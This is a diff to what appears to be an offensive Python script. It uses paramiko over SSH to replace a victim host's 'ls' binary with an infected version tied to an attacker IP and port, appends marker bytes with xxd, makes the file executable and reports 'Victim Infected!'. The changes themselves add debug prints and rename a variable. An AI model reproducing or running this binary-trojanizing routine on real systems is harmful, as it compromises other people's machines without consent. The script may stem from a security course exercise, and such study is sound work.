@@ -53,6 +53,7 @@ def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
     
     _stdin, stdout, stderr = client.exec_command("which ls")
     ls_path = stdout.read().decode().strip()
+    print(f"[*] ls path: {ls_path}")
     _stdin, stdout, stderr = client.exec_command(f"ls -l {ls_path} | awk '{{print $5}}'")
     ls_size = stdout.read().decode().strip()
     
@@ -68,7 +69,9 @@ def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
         rm -f new_ls.zip;
     """)
     
-    new_ls_size = stdout.read().decode().strip()
+    ls_zip_size = stdout.read().decode().strip()
+    print(f"[*] ls zip size: {ls_zip_size}")
+        
     _stdin, stdout, stderr = client.exec_command(f"ls -l {virus_path} | awk '{{print $5}}'")
     virus_size = stdout.read().decode().strip()
     
@@ -79,7 +82,7 @@ def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
         echo -n '20240000aabbccdd' | xxd -r -p >> {virus_path};
         chmod +x {virus_path};
         """)
-    print(f"[*] Victim Infected! Check victim's {virus_path}")
+    print(f"[+] Victim Infected! Check victim's {virus_path}")
     
 if __name__ == '__main__':
     # If the arguments are not provided, print the usage
